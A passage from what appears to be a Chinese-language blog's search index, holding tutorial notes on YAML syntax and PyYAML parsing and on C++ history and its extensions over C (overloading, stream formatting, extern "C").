href="https://yaml.org/spec/1.2/spec.html#sequence//">sequences</a> (arrays/lists)</td></tr><tr><td>Scales</td><td>纯量，不可分割的值</td><td><a href="https://yaml.org/spec/1.2/spec.html#scalar//">scalars</a> (strings/numbers)</td></tr></tbody></table><h3 id="对象"><a class="markdownIt-Anchor" href="#对象"></a> 对象</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">animal:</span> <span class="string">pets</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">animal:</span> <span class="string">&#x27;pets&#x27;</span> &#125;</span><br><span class="line"><span class="attr">hash:</span> &#123; <span class="attr">name:</span> <span class="string">Steve</span>, <span class="attr">foo:</span> <span class="string">bar</span> &#125; </span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">hash:</span> &#123; <span class="attr">name:</span> <span class="string">&#x27;Steve&#x27;</span>, <span class="attr">foo:</span> <span class="string">&#x27;bar&#x27;</span> &#125; &#125;</span><br></pre></td></tr></table></figure><h3 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Cat</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Dog</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Goldfish</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> [ <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Goldfish&#x27;</span> ]</span><br><span class="line"><span class="bullet">-</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">Cat</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">Dog</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">Goldfish</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> [ [ <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Goldfish&#x27;</span> ] ]</span><br><span class="line"><span class="attr">animal:</span> [<span class="string">Cat</span>, <span class="string">Dog</span>]</span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">animal:</span> [ <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Dog&#x27;</span> ] &#125;</span><br></pre></td></tr></table></figure><h3 id="纯量"><a class="markdownIt-Anchor" href="#纯量"></a> 纯量</h3><ul><li>数值类型：字符串、整数、浮点数</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">number:</span> <span class="number">12.30</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">number:</span> <span class="number">12.30</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>布尔值</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">isSet:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">isSet:</span> <span class="literal">true</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>Null</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">parent:</span> <span class="string">~</span> </span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">parent:</span> <span class="literal">null</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>时间</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 采用 ISO8601 格式</span></span><br><span class="line"><span class="attr">iso8601:</span> <span class="number">2001-12-14t21:59:43.10-05:00</span> </span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">iso8601:</span> <span class="string">new</span> <span class="string">Date(&#x27;2001-12-14t21:59:43.10-05:00&#x27;)</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>日期</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 采用复合 iso8601 格式的年、月、日表示</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">1976-07-31</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">date:</span> <span class="string">new</span> <span class="string">Date(&#x27;1976-07-31&#x27;)</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="字符串详解"><a class="markdownIt-Anchor" href="#字符串详解"></a> 字符串详解</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串默认不使用引号表示。</span></span><br><span class="line"><span class="attr">str:</span> <span class="string">这是一行字符串</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">str:</span> <span class="string">&#x27;这是一行字符串&#x27;</span> &#125;</span><br><span class="line"><span class="comment"># 如果字符串之中包含空格或特殊字符，需要放在引号之中。</span></span><br><span class="line"><span class="attr">str:</span> <span class="string">&#x27;内容： 字符串&#x27;</span> </span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">str:</span> <span class="string">&#x27;内容: 字符串&#x27;</span> &#125;</span><br><span class="line"><span class="comment">#单引号和双引号都可以使用，双引号不会对特殊字符转义。</span></span><br><span class="line"><span class="attr">s1:</span> <span class="string">&#x27;内容\n字符串&#x27;</span></span><br><span class="line"><span class="attr">s2:</span> <span class="string">&quot;内容\n字符串&quot;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">s1:</span> <span class="string">&#x27;内容\\n字符串&#x27;</span>, <span class="attr">s2:</span> <span class="string">&#x27;内容\n字符串&#x27;</span> &#125;</span><br><span class="line"><span class="comment"># 单引号之中如果还有单引号，必须连续使用两个单引号转义。</span></span><br><span class="line"><span class="attr">str:</span> <span class="string">&#x27;labor&#x27;</span><span class="string">&#x27;s day&#x27;</span> </span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">str:</span> <span class="string">&#x27;labor\&#x27;s day&#x27;</span> &#125;</span><br><span class="line"><span class="comment"># 字符串可以写成多行，从第二行开始，必须有一个单空格缩进。换行符会被转为空格。</span></span><br><span class="line"><span class="attr">str:</span> <span class="string">这是一段</span></span><br><span class="line">  <span class="string">多行</span></span><br><span class="line">  <span class="string">字符串</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">str:</span> <span class="string">&#x27;这是一段 多行 字符串&#x27;</span> &#125;</span><br><span class="line"><span class="comment"># 多行字符串可以使用|保留换行符，也可以使用&gt;折叠换行。</span></span><br><span class="line"><span class="attr">this:</span> <span class="string">|</span></span><br><span class="line">  <span class="string">Foo</span></span><br><span class="line">  <span class="string">Bar</span></span><br><span class="line"><span class="attr">that:</span> <span class="string">&gt;</span></span><br><span class="line">  <span class="string">Foo</span></span><br><span class="line">  <span class="string">Bar</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">this:</span> <span class="string">&#x27;Foo\nBar\n&#x27;</span>, <span class="attr">that:</span> <span class="string">&#x27;Foo Bar\n&#x27;</span> &#125;</span><br><span class="line"><span class="comment"># +表示保留文字块末尾的换行，-表示删除字符串末尾的换行。</span></span><br><span class="line"><span class="attr">s1:</span> <span class="string">|</span></span><br><span class="line">  <span class="string">Foo</span></span><br><span class="line"><span class="attr">s2:</span> <span class="string">|+</span></span><br><span class="line">  <span class="string">Foo</span></span><br><span class="line"><span class="attr">s3:</span> <span class="string">|-</span></span><br><span class="line">  <span class="string">Foo</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">s1:</span> <span class="string">&#x27;Foo&#x27;</span>, <span class="attr">s2:</span> <span class="string">&#x27;Foo\n&#x27;</span>, <span class="attr">s3:</span> <span class="string">&#x27;Foo&#x27;</span> &#125;</span><br><span class="line"><span class="comment"># 字符串之中可以插入 HTML 标记。</span></span><br><span class="line"><span class="attr">message:</span> <span class="string">|</span></span><br><span class="line">  <span class="string">&lt;p</span> <span class="string">style=&quot;color:</span> <span class="string">red&quot;&gt;</span></span><br><span class="line">    <span class="string">段落</span></span><br><span class="line">  <span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">message:</span> <span class="string">&#x27;&lt;p style=&quot;color: red&quot;&gt;\n  段落\n&lt;/p&gt;\n&#x27;</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="数据类型转换"><a class="markdownIt-Anchor" href="#数据类型转换"></a> 数据类型转换</h3><ul><li>YAML 允许使用两个感叹号，强制转换数据类型。</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">e:</span> <span class="type">!!str</span> <span class="number">123</span></span><br><span class="line"><span class="attr">f:</span> <span class="type">!!str</span> <span class="literal">true</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span> &#123; <span class="attr">e:</span> <span class="string">&#x27;123&#x27;</span>, <span class="attr">f:</span> <span class="string">&#x27;true&#x27;</span> &#125;</span><br></pre></td></tr></table></figure><h2 id="语法格式"><a class="markdownIt-Anchor" href="#语法格式"></a> 语法格式</h2><ul><li>yaml文件大小写敏感</li><li>不允许使用用tab制表符号代替空格</li><li>使用缩进表示层级关系</li><li>缩进的空格数目不重要，只要相同层级的元素左侧对齐即可</li><li>字符串默认不使用引号表示</li><li>单引号之中如果还有单引号，必须连续使用两个单引号转义<code>'labor''s day'</code></li></ul><h3 id="符号系统"><a class="markdownIt-Anchor" href="#符号系统"></a> 符号系统</h3><table><thead><tr><th>符号</th><th>符号</th><th>说明</th></tr></thead><tbody><tr><td><code>-</code></td><td>破折号和空格</td><td>Lists集合</td></tr><tr><td><code>:</code></td><td>冒号和空格</td><td>Maps键值对</td></tr><tr><td><code>#</code></td><td>井号</td><td>注释，从这个字符一直到行尾，都会被解析器忽略</td></tr><tr><td><code>---</code></td><td>三个破折号</td><td>文档内容分隔线（多用于文档开始的地方）</td></tr><tr><td><code>...</code></td><td>三个冒号</td><td>表示文档的结束</td></tr><tr><td><code>&amp;</code><br><code>*</code><br><code>&lt;&lt;</code></td><td></td><td>在<code>-</code>或<code>:</code>后加上<code>&amp;</code>用来建立锚点（defaults）<br>使用<code>&lt;&lt;: *锚点名</code>直接将锚点数据插入到当前的数据中<br><code>*锚点名</code>用来引用锚点。两者成对表达，像定义变量a，再引用变量a的关系，是一种重复项的替换。</td></tr><tr><td><code>~</code></td><td>波浪</td><td>null</td></tr><tr><td><code>!!</code></td><td>双感叹号</td><td>表示强制转换数据类型<code>e: !!str 123</code></td></tr><tr><td><code>|</code></td><td></td><td>保留多行文本（保留换行符）</td></tr><tr><td>&gt;</td><td></td><td>将多行拼接为一行</td></tr></tbody></table><h3 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h3><ul><li>锚点<code>&amp;</code>：建立锚点（defaults），别名<code>*</code>：用来引用锚点，<code>&lt;&lt;</code>表示合并到当前数据。</li></ul><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">defaults:</span> <span class="meta">&amp;defaults</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line"><span class="attr">defaults:</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"><span class="comment"># 锚点</span></span><br><span class="line"><span class="attr">hr:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Mark</span> <span class="string">McGwire</span></span><br><span class="line">  <span class="comment"># Following node labeled SS</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&amp;SS</span> <span class="string">Sammy</span> <span class="string">Sosa</span></span><br><span class="line"><span class="attr">rbi:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">*SS</span> <span class="comment"># Subsequent occurrence</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Ken</span> <span class="string">Griffey</span></span><br></pre></td></tr></table></figure><h1 id="python解析yaml"><a class="markdownIt-Anchor" href="#python解析yaml"></a> python解析yaml</h1><ul><li>更多操作可参考<a href="https://pyyaml.org/wiki/PyYAMLDocumentation">pyyaml官方文档</a></li></ul><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>安装</td><td><code>pip3 install pyyaml</code></td></tr><tr><td>load</td><td><code>yaml.load()</code><br><code>yaml.safe_load(YAML字符串或文件句柄)</code></td></tr><tr><td>dump</td><td><code>yaml.dump</code>(字典)：默认为flow流格式，即字典{b’: {‘c’: 3, ‘d’: 4}}，会被转为b: {c: 3, d: 4}形式，可以使用default_flow_style=False关闭流模式</td></tr></tbody></table><ul><li>由于yaml.load()支持原生Python对象，不安全，建议使用yaml.safe_load()</li></ul><h2 id="示例"><a class="markdownIt-Anchor" href="#示例"></a> 示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">yaml_str = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name: Cactus</span></span><br><span class="line"><span class="string">age: 18</span></span><br><span class="line"><span class="string">skills: </span></span><br><span class="line"><span class="string">  -</span></span><br><span class="line"><span class="string">    - Python</span></span><br><span class="line"><span class="string">    - 3</span></span><br><span class="line"><span class="string">  -</span></span><br><span class="line"><span class="string">    - Java</span></span><br><span class="line"><span class="string">    - 5</span></span><br><span class="line"><span class="string">has_blog: true</span></span><br><span class="line"><span class="string">gf: ~</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">dict_var = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Cactus&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;skills&#x27;</span>: [[<span class="string">&#x27;Python&#x27;</span>, <span class="number">3</span>], [<span class="string">&#x27;Java&#x27;</span>, <span class="number">5</span>]], <span class="string">&#x27;has_blog&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;gf&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="comment"># yaml字符串 -&gt; 字典</span></span><br><span class="line">print(yaml.safe_load(yaml_str)) </span><br><span class="line"><span class="comment"># yaml文件 -&gt; 字典</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;demo.yaml&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:   <span class="comment"># demo.yaml内容同上例yaml字符串 </span></span><br><span class="line">    print(yaml.safe_load(f))</span><br><span class="line"><span class="comment"># 字典 -&gt; yaml字符串或文件</span></span><br><span class="line">print(yaml.dump(dict_var,))  <span class="comment"># 转为字符串，使用默认flow流格式</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;demo5.yaml&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    yaml.dump(dict_var, f, default_flow_style=<span class="literal">False</span>)  <span class="comment"># 写入文件，不是用flow流格式</span></span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++</title>
      <link href="/2020/07/13/C/"/>
      <url>/2020/07/13/C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><code>c++</code>记录</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><ul><li>1982 年，美国 AT&amp;T 公司贝尔实验室的 Bjarne Stroustrup 博士在 c 语言的基础上引入并扩充了面向对象的概念，发明了一种新的程序语言。为了表达该语言与 c 语言的渊源关系，它被命名为 <code>C++</code>。而 Bjarne Stroustrup（本贾尼·斯特劳斯特卢普）博士被尊称为<code>C++</code>语言之父。</li></ul><h2 id="历史"><a class="markdownIt-Anchor" href="#历史"></a> 历史</h2><ul><li>在“C with Class”阶段，研制者在 C 语言的基础上加进去的特征主要有：类及派生类、共有和私有成员的区分、类的构造函数和析构函数、友元、内联函数、赋值运算符的重载等。</li><li>1985 年公布的 <code>C++</code>语言 1.0 版的内容中又添加了一些重要特征：虚函数的概念、函数和运算符的重载、引用、常量（constant）等。</li><li>1989 年推出的 2.0 版形成了更加完善的支持面向对象程序设计的 <code>C++</code>语言，新增加的内容包括：类的保护成员、多重继承、对象的初始化与赋值的递归机制、抽象类、静态成员函数、const 成员函数等。</li><li>1993 年的 <code>C++</code>语言 3.0 版本是 <code>C++</code>语言的进一步完善，其中最重要的新特征是模板（template）,此外解决了多重继承产生的二义性问题和相应的构造函数与析构函数的处理等。</li><li>1998 年 <code>C++</code>标准（<code>ISO/IEC14882 Standard for the C++ Programming Language</code>）得到了国际标准化组织（ISO）和美国标准化协会（ANSI）的批准，标准 <code>C++</code>语言及其标准库更体现了 <code>C++</code>语言设计的初衷。名字空间的概念、标准模板库（STL）中增加的标准容器类、通用算法类和字符串类型等使得 <code>C++</code>语言更为实用。此后 <code>C++</code>是具有国际标准的编程语言，该标准通常简称 <code>ANSI C++</code>或 <code>ISO C++ 98</code> 标准，以后每 5 年视实际需要更新一次标准。</li><li>后来又在 2003 年通过了 <code>C++</code>标准第二版（ISO/IEC 14882:2003）：这个新版本是一次技术性修订，对第一版进行了整理——修订错误、减少多义性等，但没有改变语言特性。这个版本常被称为 <code>C++03</code>。</li><li>此后，新的标准草案叫做 <code>C++ 0x</code>。对于 <code>C++ 0x</code> 标准草案的最终国际投票已于 2011 年 8 月 10 日结束，并且所有国家都投出了赞成票，<code>C++0x</code> 已经毫无异议地成为正式国际标准。先前被临时命名为 <code>C++0x</code> 的新标准正式定名为 ISO/IEC 14882:2011，简称 <code>ISO C++11</code> 标准。<code>C++ 11</code> 标准将取代现行的 <code>C++</code>标准 <code>C++98</code> 和 <code>C++03</code>。国际标准化组织于 2011 年 9 月 1 日出版发布《ISO/IEC 14882:2011》，名称是：<code>Information technology -- Programming languages -- C++ Edition: 3</code>。</li><li><code>C++</code>标准第四版，2014年8月18日发布。正式名称为ISO/IEC 14882:2014。<code>C++14</code>是<code>C++11</code>的增量更新，主要是支持普通函数的返回类型推演，泛型 lambda，扩展的 lambda 捕获，对 constexpr 函数限制的修订，constexpr变量模板化等。</li><li><code>C++17</code></li><li><code>C++20</code></li></ul><h2 id="内容"><a class="markdownIt-Anchor" href="#内容"></a> 内容</h2><ul><li><code>C++</code>语言的名字，如果看作 c 的基本语法，是由操作数 c 和运算符后<code>++</code>构成。<code>C++</code>是本身这门语言先是 c,是完全兼容 c.然后在此基础上<code>++</code>。这个<code>++</code>包含三大部分，<code>c++</code>对 c的基础语法的扩展，面向对像(继承，封装，多态)，STL 等</li></ul><h1 id="c对c的扩展externsion"><a class="markdownIt-Anchor" href="#c对c的扩展externsion"></a> <code>C++</code>对C的扩展(Externsion)</h1><h2 id="类型增强"><a class="markdownIt-Anchor" href="#类型增强"></a> 类型增强</h2><ul><li>类型检查更严格<ul><li>比如，把一个 const 类型的指针赋给非 const 类型的指针。c 语言中可以通的过，但是在 <code>c++</code>中则编不过去。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> b = a;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *pa = &amp;a;</span><br><span class="line"><span class="keyword">int</span> *pb = pa;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>布尔类型（bool）</p><ul><li>c 语言的逻辑真假用 0 和非 0 来表示。而 <code>c++</code>中有了具体的类型。</li></ul></li><li><p>真正的枚举(enum)</p><ul><li>c 语言中枚举本质就是整型，枚举变量可以用任意整型赋值。而 c++中枚举变量，只能用被枚举出来的元素初始化。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> season &#123;SPR,SUM,AUT,WIN&#125;;</span><br></pre></td></tr></table></figure><ul><li>表达式的值可被赋值<ul><li>c 语言中表达式通常不能作为左值的，即不可被赋值，<code>c++</code>中某些表达式是可以赋值的。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a,b = <span class="number">5</span>;</span><br><span class="line">(a = b) = <span class="number">10</span>;  <span class="comment">//b的值给了a，10的值又继续给了a</span></span><br><span class="line">(a&lt;b? a:b) = <span class="number">200</span>;</span><br></pre></td></tr></table></figure><h2 id="输入与输出cin-cout"><a class="markdownIt-Anchor" href="#输入与输出cin-cout"></a> 输入与输出(cin /cout)</h2><h3 id="cin-cout"><a class="markdownIt-Anchor" href="#cin-cout"></a> cin &amp;&amp; cout</h3><ul><li>cin 和 cout 是 <code>C++</code>的标准输入流和输出流。他们在头文件 iostream 中定义。cin是类对象，&gt;&gt;流输入运算符，重载。</li></ul><table><thead><tr><th>流名</th><th>含义</th><th>隐含设备</th><th>流名</th><th>含义</th><th>隐含设备</th></tr></thead><tbody><tr><td>cin</td><td>标准输入</td><td>键盘</td><td>cerr</td><td>标准错误输出</td><td>屏幕</td></tr><tr><td>cout</td><td>标准输出</td><td>屏幕</td><td>clog</td><td>cerr 的缓冲输出</td><td>屏幕</td></tr></tbody></table><h3 id="格式化"><a class="markdownIt-Anchor" href="#格式化"></a> 格式化</h3><h4 id="设置域宽及位数"><a class="markdownIt-Anchor" href="#设置域宽及位数"></a> 设置域宽及位数</h4><ul><li>对于实型，cout 默认输出六位有效数据，setprecision(2) 可以设置有效位数，<code>setprecision(n)&lt;&lt;setiosflags(ios::fixed)</code>合用，可以设置小数点右边的位数。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c\n%d\n%f\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">100</span>,<span class="number">120.00</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5c\n%5d\n%6.2f\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">100</span>,<span class="number">120.00</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;setw(<span class="number">5</span>)&lt;&lt;<span class="string">&#x27;a&#x27;</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;setw(<span class="number">5</span>)&lt;&lt;<span class="number">100</span>&lt;&lt;<span class="built_in">endl</span></span><br><span class="line">&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;setiosflags(ios::fixed)&lt;&lt;<span class="number">120.00</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="按进制输出"><a class="markdownIt-Anchor" href="#按进制输出"></a> 按进制输出</h4><ul><li>输出十进制，十六进制，八进制。默认输出十进制的数据。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">123</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;dec&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;hex&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;oct&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;setbase(<span class="number">16</span>)&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><h4 id="设置填充符"><a class="markdownIt-Anchor" href="#设置填充符"></a> 设置填充符</h4><ul><li>还可以设置域宽的同时，设置左右对齐及填充字符。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;setw(<span class="number">10</span>)&lt;&lt;<span class="number">1234</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;setw(<span class="number">10</span>)&lt;&lt;setfill(<span class="string">&#x27;0&#x27;</span>)&lt;&lt;<span class="number">1234</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;setw(<span class="number">10</span>)&lt;&lt;setfill(<span class="string">&#x27;0&#x27;</span>)&lt;&lt;setiosflags(ios::left)&lt;&lt;<span class="number">1234</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;setw(<span class="number">10</span>)&lt;&lt;setfill(<span class="string">&#x27;-&#x27;</span>)&lt;&lt;setiosflags(ios::right)&lt;&lt;<span class="number">1234</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数重载function-overload"><a class="markdownIt-Anchor" href="#函数重载function-overload"></a> 函数重载(function overload)</h2><h3 id="重载规则"><a class="markdownIt-Anchor" href="#重载规则"></a> 重载规则</h3><ul><li>重载规则：<ol><li>函数名相同。</li><li>参数个数不同，参数的类型不同，参数顺序不同，均可构成重载。</li><li>返回值类型不同则不可以构成重载。</li></ol></li><li>有的函数虽然有返回值类型，但不与参数表达式运算，而作一条单独的语句。</li></ul><h3 id="匹配原则"><a class="markdownIt-Anchor" href="#匹配原则"></a> 匹配原则</h3><ul><li><p>匹配原则：</p><ol><li>严格匹配，找到则调用。</li><li>通过隐式转换寻求一个匹配，找到则调用。</li></ol></li><li><p><code>C++</code> 允许，int 到 long 和 double，double 到 int 和 float 隐式类型转换。遇到这种情型，则会引起二义性。</p></li></ul><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><ul><li><code>C++</code>利用 name mangling(倾轧)技术，来改名函数名，区分参数不同的同名函数。</li><li>实现原理：用 v-c- i-f- l- d 表示 void char int float long double 及其引用。</li></ul><h3 id="操作符重载operator-overload"><a class="markdownIt-Anchor" href="#操作符重载operator-overload"></a> 操作符重载(operator overload)</h3><ul><li><code>c++</code>认为一切操作符都是函数，而函数是可以重载的。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">COMP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">float</span> real;</span><br><span class="line">  <span class="keyword">float</span> image;</span><br><span class="line">&#125;;</span><br><span class="line">COMP <span class="keyword">operator</span>+(COMP one, COMP another)</span><br><span class="line">&#123;</span><br><span class="line">  one.real += another.real;</span><br><span class="line">  one.image += another.image;</span><br><span class="line">  <span class="keyword">return</span> one;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>示例中重载了一个全局的操作符+号用于实现将两个自定义结构体类型相加。本质是<code>operator+</code>函数的调用。</li></ul><h2 id="extern-c"><a class="markdownIt-Anchor" href="#extern-c"></a> extern “C”</h2><ul><li>name mangling 发生在两个阶段，.cpp 编译阶段，和.h 的声明阶段。只有两个阶段同时进行，才能匹配调用。</li><li>c++ 完全兼容 c 语言，那就面临着，完全兼容 c 的类库。由.c 文件的类库文件中函数名，并没有发生 name mangling 行为，而我们在包含.c 文件所对应的.h 文件时，.h 文件要发生name manling 行为，因而会发生在链接的时候的错误。</li><li><code>C++</code>为了避免上述错误的发生，重载了关键字 extern。只需要,要避免 name manling的函数前，加 extern “C” 如有多个，则 extern “C”{}</li></ul><figure class="highlight 